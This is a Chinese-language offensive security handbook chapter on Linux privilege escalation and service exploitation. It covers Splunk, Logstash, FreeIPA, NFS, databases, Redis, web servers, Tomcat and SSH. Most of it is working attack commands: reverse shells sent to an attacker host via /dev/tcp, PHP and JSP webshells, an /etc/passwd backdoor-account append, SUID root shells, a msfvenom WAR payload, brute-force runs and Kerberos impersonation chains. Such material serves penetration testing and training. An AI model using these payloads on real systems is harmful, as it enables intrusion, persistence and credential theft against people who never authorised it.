## 1. Splunk 本地提权与持久化

> 原始文档：[Splunk本地提权与持久化.md](../reference/Splunk本地提权与持久化.md)

如果在**内部**或**外部****枚举**机器时发现 **Splunk 正在运行**（端口8090），如果您幸运地知道任何**有效凭据**，就可以**滥用Splunk服务**来以运行Splunk的用户身份**执行shell**。如果root正在运行它，您可以提权到root。

此外，如果您**已经是root且Splunk服务不仅在localhost上监听**，您可以从Splunk服务中**窃取**密码文件并**破解**密码，或者**向其中添加新的**凭据。并在主机上维持持久化。

### 1.1 Universal Forwarder 代理漏洞利用

**漏洞利用概述：**
针对 Splunk Universal Forwarder 代理（UF）的漏洞利用允许拥有代理密码的攻击者在运行该代理的系统上执行任意代码，可能危及整个网络。

**关键要点：**

- UF代理不验证传入连接或代码的真实性，使其容易受到未授权代码执行的攻击。
- 常见的密码获取方法包括在网络目录、文件共享或内部文档中定位密码。
- 成功利用可导致在受损主机上获得SYSTEM或root级别的访问权限、数据外泄以及进一步的网络渗透。

**漏洞利用执行：**

1. 攻击者获取UF代理密码。
2. 利用Splunk API向代理发送命令或脚本。
3. 可能的操作包括文件提取、用户账户操作和系统入侵。

**影响：**

- 在每台主机上以SYSTEM/root级别权限完全控制网络。
- 有可能禁用日志记录以逃避检测。
- 安装后门或勒索软件。

**漏洞利用示例命令：**

```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```

- [PySplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2)
- [Exploit-DB 46238](https://www.exploit-db.com/exploits/46238)

## 2. Logstash 权限提升

Logstash 用于**收集、转换和分发日志**，通过一个称为**管道（pipelines）**的系统。这些管道由**输入（input）**、**过滤器（filter）**和**输出（output）**阶段组成。当 Logstash 在被入侵的机器上运行时，会出现一个有趣的问题。

### 2.1 快速枚举

在安装了 Logstash 的机器上，快速检查：

```bash
ps aux | grep -i logstash
systemctl cat logstash 2>/dev/null
cat /etc/logstash/pipelines.yml 2>/dev/null
cat /etc/logstash/logstash.yml 2>/dev/null
find /etc/logstash /usr/share/logstash -maxdepth 3 -type f \( -name '*.conf' -o -name 'logstash.yml' -o -name 'pipelines.yml' \) -ls
rg -n --hidden -S 'password|passwd|api[_-]?key|cloud_auth|ssl_keystore_password|truststore_password|user\s*=>|hosts\s*=>' /etc/logstash /usr/share/logstash 2>/dev/null
```

同时检查本地监控 API 是否可达。默认情况下它绑定在 **127.0.0.1:9600**，这通常在入侵主机后就足够了：

```bash
curl -s http://127.0.0.1:9600/?pretty
curl -s http://127.0.0.1:9600/_node/pipelines?pretty
curl -s http://127.0.0.1:9600/_node/stats/pipelines?pretty
```

这通常会为您提供管道ID、运行时详情，以及确认您修改的管道是否已被加载。

从 Logstash 恢复的凭据通常可以解锁 **Elasticsearch**，因此请查看[关于 Elasticsearch 的页面](../../network-services-pentesting/9200-pentesting-elasticsearch.md)。

### 2.2 管道配置与利用条件

管道在文件 **/etc/logstash/pipelines.yml** 中配置，该文件列出了管道配置的位置：

```yaml
# 在此定义您的管道。可以定义多个管道。
# 有关多个管道的详情，请参阅文档：
# https://www.elastic.co/guide/en/logstash/current/multiple-pipelines.html

- pipeline.id: main
  path.config: "/etc/logstash/conf.d/*.conf"
- pipeline.id: example
  path.config: "/usr/share/logstash/pipeline/1*.conf"
  pipeline.workers: 6
```

该文件揭示了包含管道配置的 **.conf** 文件所在位置。当使用 **Elasticsearch 输出模块**时，**管道**通常会包含 **Elasticsearch 凭据**，由于 Logstash 需要向 Elasticsearch 写入数据，这些凭据通常拥有广泛的权限。配置路径中的通配符允许 Logstash 在指定目录中执行所有匹配的管道。

如果 Logstash 使用 `-f <directory>` 而不是 `pipelines.yml` 启动，**该目录中的所有文件将按字典顺序连接并作为单个配置解析**。这会产生 2 个攻击性影响：

- 像 `000-input.conf` 或 `zzz-output.conf` 这样的投放文件可以改变最终管道的组装方式
- 格式错误的文件可以阻止整个管道加载，因此在依赖自动重新加载之前请仔细验证有效载荷

要尝试权限提升，首先确定 Logstash 服务运行的用户，通常是 **logstash** 用户。确保满足以下条件**之一**：

- 拥有管道 **.conf** 文件的**写入权限** **或**
- **/etc/logstash/pipelines.yml** 文件使用了通配符，并且您可以写入目标文件夹

此外，还必须满足以下条件**之一**：

- 能够重启 Logstash 服务 **或**
- **/etc/logstash/logstash.yml** 文件设置了 **config.reload.automatic: true**

### 2.3 可写管道提权

如果配置中有通配符，创建匹配此通配符的文件可以执行命令。例如：

```bash
input {
  exec {
    command => "whoami"
    interval => 120
  }
}

output {
  file {
    path => "/tmp/output.log"
    codec => rubydebug
  }
}
```

这里，**interval** 决定了执行频率（以秒为单位）。在给定示例中，**whoami** 命令每 120 秒运行一次，其输出被定向到 **/tmp/output.log**。

如果 **/etc/logstash/logstash.yml** 中设置了 **config.reload.automatic: true**，Logstash 将自动检测并应用新的或修改的管道配置，无需重启。如果没有通配符，仍然可以修改现有配置，但建议谨慎操作以避免中断。

`exec` 输入插件在当前版本中仍然有效，需要 `interval` 或 `schedule` 参数。它通过**fork** Logstash JVM 来执行，因此如果内存紧张，您的有效载荷可能会因 `ENOMEM` 而失败，而不是静默运行。

更实用的权限提升有效载荷通常是留下持久性工件的：

```bash
input {
  exec {
    command => "cp /bin/bash /tmp/logroot && chown root:root /tmp/logroot && chmod 4755 /tmp/logroot"
    interval => 300
  }
}
output {
  null {}
}
```

如果您没有重启权限但可以向进程发送信号，Logstash 在类 Unix 系统上也支持 **SIGHUP** 触发的重新加载：

```bash
kill -SIGHUP $(pgrep -f logstash)
```

请注意，并非每个插件都支持重新加载。例如，**stdin** 输入会阻止自动重新加载，因此不要假设 `config.reload.automatic` 总是会加载您的更改。

### 2.4 窃取凭据与秘密

在只关注代码执行之前，先收集 Logstash 已经可以访问的数据：

- 明文凭据通常硬编码在 `elasticsearch {}` 输出、`http_poller`、JDBC 输入或云相关设置中
- 安全设置可能存储在 **`/etc/logstash/logstash.keystore`** 或其他 `path.settings` 目录中
- 密钥库密码通常通过 **`LOGSTASH_KEYSTORE_PASS`** 提供，基于包的安装通常从 **`/etc/sysconfig/logstash`** 获取
- 使用 `${VAR}` 的环境变量扩展在 Logstash 启动时解析，因此服务环境值得检查

有用的检查：

```bash
ls -l /etc/logstash /etc/logstash/logstash.keystore 2>/dev/null
strings /etc/logstash/conf.d/*.conf 2>/dev/null | head
tr '\0' '\n' < /proc/$(pgrep -o -f logstash)/environ 2>/dev/null | sort
cat /etc/sysconfig/logstash 2>/dev/null
journalctl -u logstash --no-pager 2>/dev/null | tail -n 200
ls -lah /var/log/logstash 2>/dev/null
```

这也值得检查，因为 **CVE-2023-46672** 表明 Logstash 在特定情况下可能在日志中记录敏感信息。在后渗透主机上，旧的 Logstash 日志和 `journald` 条目可能会泄露凭据，即使当前配置引用密钥库而不是内联存储秘密。

### 2.5 集中管道管理滥用

在某些环境中，主机**不**依赖本地 `.conf` 文件。如果配置了 **`xpack.management.enabled: true`**，Logstash 可以从 Elasticsearch/Kibana 拉取集中管理的管道，启用此模式后本地管道配置不再是真实来源。

这意味着不同的攻击路径：

1. 从本地 Logstash 设置、密钥库或日志中恢复 Elastic 凭据
2. 验证帐户是否具有 **`manage_logstash_pipelines`** 集群权限
3. 创建或替换集中管理的管道，使 Logstash 主机在下一个轮询间隔执行您的有效载荷

用于此功能的 Elasticsearch API 是：

```bash
curl -X PUT http://ELASTIC:9200/_logstash/pipeline/pwned \
  -H 'Content-Type: application/json' \
  -u user:password \
  -d '{
    "description": "malicious pipeline",
    "pipeline": "input { exec { command => \"id > /tmp/.ls-rce\" interval => 120 } } output { null {} }",
    "pipeline_metadata": {"type": "logstash_pipeline", "version": "1"},
    "pipeline_settings": {"pipeline.workers": 1, "pipeline.batch.size": 1}
  }'
```

当本地文件为只读但 Logstash 已注册为远程获取管道时，这特别有用。

**参考资料：**

- [Elastic文档：重新加载配置文件](https://www.elastic.co/guide/en/logstash/8.19/reloading-config.html)
- [Elastic文档：配置集中管道管理](https://www.elastic.co/guide/en/logstash/8.19/configuring-centralized-pipelines.html)

## 3. FreeIPA 渗透测试

> 原始文档：[FreeIPA渗透测试.md](../reference/FreeIPA渗透测试.md)

### 3.1 指纹特征识别

**文件与环境变量：**

- `/etc/krb5.conf` 文件存储了 Kerberos 客户端信息，用于域注册。包括 KDC 和管理服务器位置、默认设置和映射关系。
- IPA 客户端和服务器的系统级默认设置在 `/etc/ipa/default.conf` 文件中配置。
- 域内的主机必须在 `/etc/krb5.keytab` 位置有 `krb5.keytab` 文件用于认证过程。
- 各种环境变量（`KRB5CCNAME`、`KRB5_KTNAME`、`KRB5_CONFIG`、`KRB5_KDC_PROFILE`、`KRB5RCACHETYPE`、`KRB5RCACHEDIR`、`KRB5_TRACE`、`KRB5_CLIENT_KTNAME`、`KPROP_PORT`）用于指向与 Kerberos 认证相关的特定文件和设置。

**二进制工具：**

`ipa`、`kdestroy`、`kinit`、`klist`、`kpasswd`、`ksu`、`kswitch` 和 `kvno` 等工具是管理 FreeIPA 域、处理 Kerberos 票据、更改密码和获取服务票据的关键工具。

**网络：**

提供了典型 FreeIPA 服务器设置的示意图。

### 3.2 认证机制

FreeIPA 中的认证利用 **Kerberos**，与 **Active Directory** 中的方式类似。访问域资源需要有效的 Kerberos 票据，根据 FreeIPA 域配置，票据可以存储在不同的位置。

> **注意**：Kerberos 票据的通用窃取与重用技术（CCACHE、密钥环、SSSD KCM、keytab）详见 [02-身份鉴别与认证绕过.md 第3章](../02-身份鉴别与认证绕过.md)。本节仅描述 FreeIPA 环境下的特有机制。

**CCACHE 票据文件：**

CCACHE 文件通常存储在 **`/tmp`** 目录下，权限为 **600**，是以二进制格式存储的 Kerberos 凭据。由于其可移植性，对于在没有用户明文密码的情况下进行认证非常重要。可以使用 `klist` 命令解析 CCACHE 票据，重用有效的 CCACHE 票据需要将 `KRB5CCNAME` 导出为票据文件的路径。

**Unix 密钥环：**

CCACHE 票据也可以存储在 Linux 密钥环中，提供对票据管理的更多控制。票据存储的范围各不相同（`KEYRING:name`、`KEYRING:process:name`、`KEYRING:thread:name`、`KEYRING:session:name`、`KEYRING:persistent:uidnumber`），`klist` 能够为用户解析这些信息。

**Keytab：**

Keytab 文件包含 Kerberos 主体和加密密钥，对于在不需要主体密码的情况下获取有效的票据授予票据（TGT）至关重要。可以使用 `klist` 等实用程序和 **KeytabParser** 等脚本轻松解析和重用 keytab 文件中的凭据。

### 3.3 信息枚举

> [!WARNING]
> 您可以通过 **ldap** 和其他**二进制**工具进行**枚举**，或者**连接到 FreeIPA 服务器 443 端口的网页**。

**主机、用户和组：**

可以创建**主机**、**用户**和**组**。主机和用户分别被归入名为"**主机组**"和"**用户组**"的容器中。这些类似于**组织单位**（OU）。

FreeIPA 默认允许 **LDAP 匿名绑定**，大量数据可以在**未认证**的情况下被枚举。以下命令可以枚举所有未认证可访问的数据：

```bash
ldapsearch -x
```

要获取**更多信息**，您需要使用**已认证**的会话（请查看认证部分了解如何准备已认证的会话）。

```bash
# 获取域中所有用户
ldapsearch -Y gssapi -b "cn=users,cn=compat,dc=domain_name,dc=local"

# 获取用户组
ldapsearch -Y gssapi -b "cn=groups,cn=accounts,dc=domain_name,dc=local"

# 获取所有主机
ldapsearch -Y gssapi -b "cn=computers,cn=accounts,dc=domain_name,dc=local"

# 获取主机组
ldapsearch -Y gssapi -b "cn=hostgroups,cn=accounts,dc=domain_name,dc=local"
```

从已加入域的机器上，您可以使用**已安装的二进制工具**来枚举域信息：

```bash
ipa user-find
ipa usergroup-find
ipa host-find
ipa host-group-find

-------------------

ipa user-show <username> --all
ipa usergroup-show <user group> --all
ipa host-find <host> --all
ipa hostgroup-show <host group> --all
```

> [!TIP]
> **FreeIPA** 的 **admin** 用户等同于 **AD** 中的 **domain admins**。

**哈希提取：**

**IPA 服务器**的 **root** 用户可以访问密码**哈希**。

- 用户的密码哈希以 **base64** 编码存储在 "**userPassword**" **属性**中。此哈希可能是 **SSHA512**（旧版本的 FreeIPA）或 **PBKDF2_SHA256**。
- 如果系统与 **AD** **集成**，密码的 **Nthash** 以 **base64** 编码存储在 "**ipaNTHash**" 中。

破解这些哈希：

- 如果 freeIPA 与 AD 集成，**ipaNTHash** 容易破解：您应该**解码** **base64** -> 将其重新编码为 **ASCII** 十六进制 -> John The Ripper 或 **hashcat** 可以帮助您快速破解
- 如果使用旧版本的 FreeIPA，即使用 **SSHA512**：您应该解码 **base64** -> 找到 SSHA512 **哈希** -> John The Ripper 或 **hashcat** 可以帮助您破解
- 如果使用新版本的 FreeIPA，即使用 **PBKDF2_SHA256**：您应该解码 **base64** -> 找到 PBKDF2_SHA256 -> 其**长度**为 256 字节。John 可以处理 256 位（32 字节）-> SHA-265 用作伪随机函数，块大小为 32 字节 -> 您可以仅使用 PBKDF2_SHA256 哈希的前 256 位 -> John The Ripper 或 hashcat 可以帮助您破解

要提取哈希，您需要成为 **FreeIPA 服务器上的 root**，然后可以使用 **`dbscan`** 工具来提取。

**HBAC 规则：**

这些是授予用户或主机对资源（主机、服务、服务组等）特定权限的规则。

```bash
# 使用 ldap 枚举
ldapsearch -Y gssapi -b "cn=hbac,dc=domain_name,dc=local"
# 使用 ipa
ipa hbacrule-find
# 显示规则信息
ipa hbacrule-show <hbacrule> --all
```

**Sudo 规则：**

FreeIPA 通过 sudo 规则实现对 **sudo 权限**的集中控制。这些规则允许或限制在域内主机上使用 sudo 执行命令。攻击者可以通过检查这些规则集来识别适用的主机、用户和允许的命令。

```bash
# 使用 ldap 枚举
ldapsearch -Y gssapi -b "cn=sudorules,cn=sudo,dc=domain_name,dc=local"
# 使用 ipa
ipa sudorule-find
# 显示规则信息
ipa sudorule-show <sudorule> --all
```

**基于角色的访问控制：**

**角色**由多个**权限**组成，每个权限包含一组**权限操作**。这些角色可以分配给用户、用户**组**、**主机**、主机组和服务。

以下命令可以枚举角色、权限和权限操作：

```bash
# 使用 ldap
ldapsearch -Y gssapi -b "cn=roles,cn=accounts,dc=westeros,dc=local"
# 使用 ipa 二进制工具
ipa role-find
ipa role-show <role> --all
ipa privilege-find
ipa privilege-show <privilege> --all
ipa permission-find
ipa permission-show <permission> --all
```

### 3.5 IPAHound 图谱分析

在 **FreeIPA** 中，普通用户通常**无法读取**真正的 **ACI / 权限 / 委派**内部信息，因此面向渗透测试的图谱必须从可读的属性中**推断有效权限**。[IPAHound](https://github.com/IPAHound/IPAHound) 以类似于 BloodHound 对 AD 的方式为 FreeIPA 做这件事，在入侵**标准用户**、**主机 keytab** 或**服务账户**后特别有用。

**收集器用法：**

```bash
# Kerberos 认证
IPAHound -k -s dc1.domain.local -a freeipa_apoc.json

# 用户名/密码认证
```

**有用的 FreeIPA 推断点：**

- **`memberOf`**：通常是从低权限推断隐藏的**角色**、**权限**和**权限操作**的最佳来源。
- **`memberManager`**：表示谁可以更改组成员资格，这是一个 **`AddMember`** 原语。
- **`managedBy`**：表示主机/组的所有权，这成为 **`Owns`** 边。
- **`ipaAllowedToPerform;read_keys`**：翻译为 **`ReadKerberosKey`**，可以暴露 keytab 检索路径。
- **`ipaAllowedToPerform;write_keys`**：翻译为计算机/服务 Kerberos 密钥的 **`ForceChangePassword`**。
- **`ipaAllowedToPerform;write_delegation`**：表示谁可以配置 **RBCD**，这成为 **`AddRBCD`**。
- **`krbTicketFlags`**：查找 `IPAKrbOkAsDelegate` 和 `IPAKrbOkToAuthAsDelegate` 以发现具有委派能力的主机/服务。
- **`ipaUserAuthType`**：如果缺失，通常允许密码认证；IPAHound 将其推导为 **`PasswordAuthAllow=True`**。

**搜索可喷洒用户和横向移动：**

使用 **`PasswordAuthAllow`** 构建聚焦的喷洒列表，而不是对每个主体进行喷洒：

```cypher
MATCH (n:IPAUser) WHERE n.PasswordAuthAllow = True
RETURN n.krbCanonicalName
```

然后使用 FreeIPA 特定的横向移动边进行跳转：

- **`CanSSH`**：HBAC 规则允许访问 `sshd`。
- **`CanSUDO`**：HBAC 允许 `sudo` **且**存在匹配的 sudo 规则。
- 检查 **`CanSUDO`** 边的属性 **`ipaSudoOpt=!authenticate`**、**`ipaSudoRunAs`**、**`cmdCategory`**、**`memberAllowCmd`** 和 **`memberDenyCmd`** 来判断该路径是否提供实际的主机提权。
- **`CanSSH`** + **`CanSUDO`** 到域控制器的路径可能足以窃取 **`id2entry.db`**，这实际上等于完全域入侵。

**服务接管、PKINIT 和委派链：**

如果您控制了一个**计算机账户**，请记住在 FreeIPA 中它通常**拥有其服务主体**。这提供了两个主要选项：

- 使用 **`ipa-getkeytab`** 重置服务密钥
- 避免重置服务密码，而是通过将证书写入被拥有的服务 LDAP 对象来滥用 **PKINIT**

最小 PKINIT 接管流程：

```bash
openssl req -new -newkey rsa:2048 -days 365 -nodes \
  -keyout private.key -out cert.csr -subj '/CN=srv.domain.local'
ipa cert-request cert.csr --certificate-out=srv.pem --principal=host/srv.domain.local
ldapmodify -h dc1.domain.local <<'EOF'
dn: krbprincipalname=test/srv.domain.local@DOMAIN.LOCAL,cn=services,cn=accounts,dc=domain,dc=local
add: userCertificate;binary
userCertificate;binary:: <base64 certificate>
EOF
kinit -X X509_user_identity=FILE:srv.pem,private.key test/srv.domain.local@DOMAIN.LOCAL
ldapwhoami -H ldap://dc1.domain.local
```

注意事项：

- CSR **CN** 需要与精确的主机名匹配。
- 使用 **`ipa`** 工具添加证书不足以完成此路径；需要通过 **LDAP** 写入 **`userCertificate;binary`**。
- 在尝试委派滥用之前，使用 **`ldapwhoami`** 验证新身份。

一旦服务有了 **`AllowedToDelegate`** 路径，使用 **S4U2proxy** 将特权账户模拟到 LDAP：

```bash
kvno -U admin -k service.keytab -P ldap/dc1.domain.local@DOMAIN.LOCAL \
  test/srv.domain.local@DOMAIN.LOCAL --out-cache ldap_admin.cache
KRB5CCNAME=ldap_admin.cache ldapwhoami -H ldap://dc1.domain.local
```

## 5. NFS 配置错误提权

### 5.1 Squashing 机制原理

NFS 通常（特别是在 Linux 中）信任客户端连接时指示的 `uid` 和 `gid` 来访问文件（如果未使用 kerberos）。但是，服务器上可以设置一些配置来**更改此行为**：

| 配置 | 说明 |
|:---|:---|
| **`all_squash`** | 压缩所有访问，将每个用户和组映射到 **`nobody`**（无符号 65534 / 有符号 -2）。因此，每个人都是 `nobody`，不使用任何用户。 |
| **`root_squash`/`no_all_squash`** | Linux 的默认设置，**仅压缩 uid 0（root）的访问**。任何 `UID` 和 `GID` 都是可信的，但 `0` 被压缩为 `nobody`（因此无法冒充 root）。 |
| **`no_root_squash`** | 甚至不会压缩 root 用户。如果您挂载了具有此配置的目录，您可以以 root 身份访问它。 |

在 **/etc/exports** 文件中，如果您发现某个目录配置为 **no_root_squash**，那么您可以**作为客户端访问**该目录，并**像本地 root 一样写入**该目录。

有关 **NFS** 的更多信息，请查看 [NFS 服务渗透测试](../../network-services-pentesting/nfs-service-pentesting.md)。

### 5.2 远程利用（no_root_squash）

**使用 bash 的选项 1：**

- **在客户端机器上挂载该目录**，并**以 root 身份将 /bin/bash 二进制文件复制**到挂载的文件夹中，给予它 **SUID** 权限，然后**从受害机器执行**该 bash 二进制文件。
    - 注意，要在 NFS 共享中成为 root，服务器上必须配置 **`no_root_squash`**。
    - 但是，如果未启用，您可以通过将二进制文件复制到 NFS 共享并以要提升权限的用户身份给予 SUID 权限来提升到其他用户。

```bash
#攻击者，以 root 用户身份
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#受害者
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```

**使用 C 编译代码的选项 2：**

- **在客户端机器上挂载该目录**，并**以 root 身份将编译好的有效载荷复制**到挂载的文件夹中，该有效载荷将滥用 SUID 权限，给予它 **SUID** 权限，然后**从受害机器执行**该二进制文件（您可以在这里找到一些 [C SUID 有效载荷](payloads-to-execute.md#c)）。

```bash
#攻击者，以 root 用户身份
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#受害者
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```

### 5.3 本地利用（NFSv3 UID 伪造）

> [!TIP]
> 注意，如果您可以从您的机器创建到受害者机器的隧道，您仍然可以使用远程版本来利用此权限提升，通过隧道传输所需的端口。\
> 以下技巧适用于 **`/etc/exports`** 文件指示 IP 的情况。在这种情况下，您**无法在任何情况下使用远程利用**，您需要**滥用此技巧**。\
> 利用工作的另一个必要条件是 **`/etc/export` 中的导出**必须使用 `insecure` 标志。

**编译库：**

该场景涉及利用本地机器上挂载的 NFS 共享，利用 NFSv3 规范中的一个缺陷，该缺陷允许客户端指定其 uid/gid，可能实现未授权访问。利用涉及使用 [libnfs](https://github.com/sahlberg/libnfs)，这是一个允许伪造 NFS RPC 调用的库。

库的编译步骤可能需要根据内核版本进行调整。在本例中，fallocate 系统调用被注释掉了。编译过程涉及以下命令：

```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```

**执行利用：**

该利用涉及创建一个简单的 C 程序（`pwn.c`），该程序将权限提升到 root 然后执行 shell。程序被编译，生成的二进制文件（`a.out`）以 suid root 放置在共享上，使用 `ld_nfs.so` 在 RPC 调用中伪造 uid：

1. **编译利用代码：**

```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```

2. **将利用放到共享上并通过伪造 uid 修改其权限：**

```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```

3. **执行利用以获取 root 权限：**

```bash
/mnt/share/a.out
#root
```

### 5.4 隐秘文件访问技巧

获得 root 访问后，为了在不更改所有权的情况下与 NFS 共享交互（以避免留下痕迹），使用 Python 脚本（nfsh.py）。此脚本调整 uid 以匹配正在访问的文件的 uid，允许在没有权限问题的情况下与共享上的文件交互：

```python
#!/usr/bin/env python
# 来自 https://www.errno.fr/nfs_privesc.html 的脚本
import sys
import os

def get_file_uid(filepath):
    try:
        uid = os.stat(filepath).st_uid
    except OSError as e:
        return get_file_uid(os.path.dirname(filepath))
    return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```

运行方式：

```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```

# 二、通用 Linux 服务漏洞利用

> **文档定位**：本章节补充常见 Linux 网络服务的漏洞利用技术，覆盖通用渗透测试场景。
> **使用方式**：根据端口扫描结果识别服务类型，查阅对应章节获取利用思路。

## 6. 数据库服务漏洞利用

### 6.1 MySQL/MariaDB 利用

**未授权访问与弱口令：**

```bash
# 常见端口：3306
# 默认用户：root，常见空密码
mysql -h <IP> -u root --skip-password
mysql -h <IP> -u root -p'' -e "SELECT @@hostname;"

# 弱口令爆破（hydra）
hydra -l root -P /usr/share/wordlists/rockyou.txt <IP> mysql
```

**UDF 提权（需 root 权限访问 MySQL）：**

```bash
# 查找 UDF 库路径
mysql -u root -p -e "SELECT @@plugin_dir;"
# 或
find / -name "lib_mysqludf_sys*" 2>/dev/null

# 如无 UDF 库，手动上传
# 下载 udf 提权库（如 sqlmap 的 udf.dll/so）
# 将 .so 文件写入 plugin_dir
mysql -u root -p -e "CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'lib_mysqludf_sys.so';"
mysql -u root -p -e "SELECT sys_exec('id');"

# 通过 MySQL 写文件反弹 shell
mysql -u root -p -e "SELECT '<?php system($_GET[\"cmd\"]);?>' INTO OUTFILE '/var/www/html/shell.php';"
```

**提权思路：**
- MySQL 以 root 运行 → UDF 执行系统命令即获 root
- MySQL 用户有 FILE 权限 → 可读写服务器文件
- MySQL 有 SELECT INTO OUTFILE → 写 webshell 到 web 目录

### 6.2 PostgreSQL 利用

**未授权访问与弱口令：**

```bash
# 常见端口：5432
psql -h <IP> -U postgres -W
psql -h <IP> -U postgres -c "SELECT version();"
```

**命令执行（COPY）：**

```sql
-- 需要 superuser 权限
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;

-- 反弹 shell
COPY cmd_exec FROM PROGRAM 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1';
SELECT * FROM cmd_exec;
```

**大对象提权：**

```sql
-- 通过大对象读取任意文件
SELECT lo_import('/etc/passwd');
SELECT lo_get(<oid>);

-- 通过大对象写入文件
SELECT lo_from_bytea(0, '恶意内容');
SELECT lo_export(<oid>, '/tmp/evil.sh');
```

### 6.3 Redis 利用

**未授权访问与弱口令：**

```bash
# 常见端口：6379
redis-cli -h <IP>
redis-cli -h <IP> -a <password>
redis-cli -h <IP> -e "INFO server"

# 弱口令爆破
hydra -P /usr/share/wordlists/rockyou.txt <IP> redis
```

**写 SSH 公钥：**

```bash
redis-cli -h <IP> -a <password> <<EOF
CONFIG SET DIR /root/.ssh
CONFIG SET DBFILENAME authorized_keys
SET x "\n\nssh-rsa AAAA...your_pub_key...\n\n"
SAVE
EOF
# 之后 ssh root@<IP> 即可
```

**写 Crontab 反弹 Shell：**

```bash
redis-cli -h <IP> -a <password> <<EOF
CONFIG SET DIR /var/spool/cron/crontabs
CONFIG SET DBFILENAME root
SET x "\n\n*/1 * * * * bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1\n\n"
SAVE
EOF
```

**写 Webshell：**

```bash
redis-cli -h <IP> -a <password> <<EOF
CONFIG SET DIR /var/www/html
CONFIG SET DBFILENAME shell.php
SET x "\n\n<?php system(\$_GET['cmd']); ?>\n\n"
SAVE
EOF
```

**主从复制 RCE（Redis 4.x/5.x）：**

```bash
# 使用 redis-rogue-server 工具
python3 redis-rogue-server.py --rhost <TARGET_IP> --lhost <ATTACKER_IP>
```

**Lua 沙箱逃逸（Redis 5.0.7 / 6.x）：**

```bash
# CVE-2022-0543 (Debian/Ubuntu)
redis-cli -h <IP> eval 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("id", "r"); local res = f:read("*a"); f:close(); return res' 0
```

## 7. Web 服务漏洞利用

### 7.1 Apache 利用

**配置错误信息泄露：**

```bash
# Server Status（mod_status）
curl http://<IP>/server-status
curl http://<IP>/server-info

# 目录列表
curl http://<IP>/cgi-bin/
```

**mod_cgi Shellshock 利用：**

```bash
# 如 CGI 程序使用 bash 处理环境变量
curl -H "User-Agent: () { :; }; echo; /bin/bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1" \
  http://<IP>/cgi-bin/vulnerable.cgi
```

**日志投毒 RCE：**

```bash
# 通过注入恶意 User-Agent 到日志
curl -A "<?php system(\$_GET['cmd']); ?>" http://<IP>/
# 然后通过 LFI 包含日志文件
curl "http://<IP>/vulnerable.php?page=/var/log/apache2/access.log&cmd=id"
```

**SSI 注入：**

```bash
# 如支持 SSI，在输入中注入
<!--#exec cmd="id"-->
```

### 7.2 Nginx 利用

**配置错误导致的路径遍历：**

```bash
# alias 配置错误
curl http://<IP>/static../etc/passwd

# 非规范化路径
curl http://<IP>/../../../etc/passwd
```

**CRLF 注入：**

```bash
# 注入响应头
curl -v "http://<IP>/%0d%0aSet-Cookie:malicious=value"
```

**请求走私（Request Smuggling）：**

```bash
# 当 Nginx 作为反向代理时
# Content-Length 和 Transfer-Encoding 冲突
```

### 7.3 Tomcat 利用

**管理台爆破：**

```bash
# 常见端口：8080
# 默认凭据：tomcat:tomcat, admin:admin, manager:manager
hydra -l tomcat -P /usr/share/wordlists/rockyou.txt <IP> http-get /manager/html

# Nmap 脚本
nmap --script http-brute -p 8080 <IP>
```

**WAR 包部署 RCE：**

```bash
# 登录 Manager 后部署恶意 WAR
msfvenom -p java/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=4444 -f war -o shell.war
curl -u tomcat:tomcat --upload-file shell.war "http://<IP>:8080/manager/text/deploy?path=/shell&update=true"
curl http://<IP>:8080/shell/
```

**PUT 上传 RCE（CVE-2017-12615）：**

```bash
# 只读 PUT 上传 JSP 文件
curl -X PUT "http://<IP>:8080/shell.jsp/" -d "<%Runtime.getRuntime().exec(request.getParameter(\"cmd\"));%>"
curl "http://<IP>:8080/shell.jsp?cmd=id"
```

**CVE-2025-24813：**

```bash
# Tomcat PUT 上传 + 反序列化
# 检查是否允许 PUT 方法
curl -X PUT http://<IP>:8080/test.txt -d "test"
```

## 8. 远程访问服务漏洞利用

### 8.1 OpenSSH 利用

**弱口令与已知凭据：**

```bash
# 常见端口：22
# 弱口令爆破
hydra -l root -P /usr/share/wordlists/rockyou.txt <IP> ssh
# 使用已知凭据
sshpass -p '<password>' ssh user@<IP>
```

**用户名枚举（CVE-2018-15473）：**

```bash
# 使用 ssh-user-enum 工具
python3 ssh-user-enum.py <IP> root admin user
```

**ssh-agent 转发劫持：**

```bash
# 如有 SSH_AUTH_SOCK 环境变量
